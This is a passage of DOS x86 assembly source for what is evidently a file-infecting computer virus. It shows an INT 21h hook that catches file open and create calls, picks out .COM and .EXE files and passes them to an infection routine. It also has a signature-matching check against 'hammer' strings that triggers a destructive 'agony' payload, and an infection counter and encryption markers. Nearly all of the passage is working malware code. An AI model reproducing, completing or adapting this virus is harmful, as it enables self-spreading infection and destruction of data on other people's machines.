overlay_31                      db      0A3h,096h,014h,0B0h,000h,0E8h,0C5h,0FFh,08Bh,016h,09Ah,014h,0B8h,000h,03Dh,0CDh
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
sig_end                         equ $

emulated_iret:                  push bp             ;store BP for further use
                                push ax             ;idem with AX
                                pushf               ;push flags into stack
                                pop  ax             ;pop flags into AX
                                mov  bp,sp          ;BP=Stack
                                mov  [bp+08h],ax    ;push flags into old stack
                                pop  ax             ;retrieve ax
                                pop  bp             ;retrieve bp
                                iret
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
;Note:
;
;Function 03ch (Create file using handle) will attempt to infect a file that's
;being created. That will generate an open error and no infection.
;
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú

test_it_fcb:                    pusha
                                push es
                                mov di,dx
                                add di,7
                                jmp test_datasteech

test_dst:                       cmp ah,00fh           ;³FCB create file
                                je  test_it_fcb       ;³
                                cmp ah,010h           ;³FCB open file
                                je  test_it_fcb       ;³
                                cmp ah,03dh           ;³HANDLE open file
                                je  test_it           ;³
                                cmp ah,03ch           ;³HANDLE create file
                                jne skip_it           ;³

test_it:                        pusha
                                push      es
                                push      dx
                                mov       di,sp
                                mov       ax,ss:[di+014h]
                                mov       es,ax
                                mov       ax,ss:[di+012h]
                                mov       di,ax
                                mov       si,offset hammer
                                mov       dh,4
compare_all:                    push      di
                                push      si
string:                         mov       cx,010h
compare:                        db        02eh
                                cmpsb                      ;cs:si = es:di?
                                jne       continue_loop
                                loop      compare

destruction:                    call      set_agony

continue_loop:                  pop       si
                                pop       di
                                add       si,010h
                                dec       dh
                                jnz       compare_all

                                pop dx
                                mov ax,ds
                                mov es,ax
                                mov di,dx
                                mov cx,080h
                                xor al,al
                                repnz scasb
                                jne where_corcho_is
                                std
                                mov al,'.'
                                repnz scasb
                                jne where_corcho_is

                                mov ax,ds:[di+2]
                                or ax,02020h   ;lower case
                                mov bl,ds:[di+4]
                                or bl,020h
                                cmp ax,'oc'
                                je may_be_com

                                cmp ax,'xe'
                                jne where_corcho_is

may_be_exe:                     cmp bl,ah            ;al='e'
                                je is_an_executable
                                jmp where_corcho_is

may_be_com:                     cmp bl,'m'
                                jne where_corcho_is

is_an_executable:               mov ah,0b9h          ;null function (or not so null)
                                                     ;used to dont execute the program
                                pushf                ;infect file will go to
                                push cs
                                call infect_file     ;real int 21

test_datasteech:                mov ax,ds:[di+2]
                                or ax,02020h   ;lower case
                                cmp ax,'sd'
                                jne  where_corcho_is
                                call set_agony

where_corcho_is:                pop es
                                popa                        ;and registers
skip_it:                        ret
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
encryption_end                  equ $
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
infect_counter                  dw 0
;úúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúúú
program_end                     equ $

int_21_lo                       dw  00000h
int_21_hi                       dw  00000h
time                            dw  000h
date                            dw  000h
filename_hi                     dw  000h
filename_lo                     dw  000h
f_att                           dw  000h
old_int24_lo                    dw  000h
old_int24_hi                    dw  000h
agony_f                         db  000h
alignment                       db  000h
hdr                             db  080h dup (0)    ;multiple purpose buffer
memory_block_end                equ $
paragraphs                      equ ((memory_block_end-program_start)+15)/16

tracker endp
bseg ends
end exe_entry_point

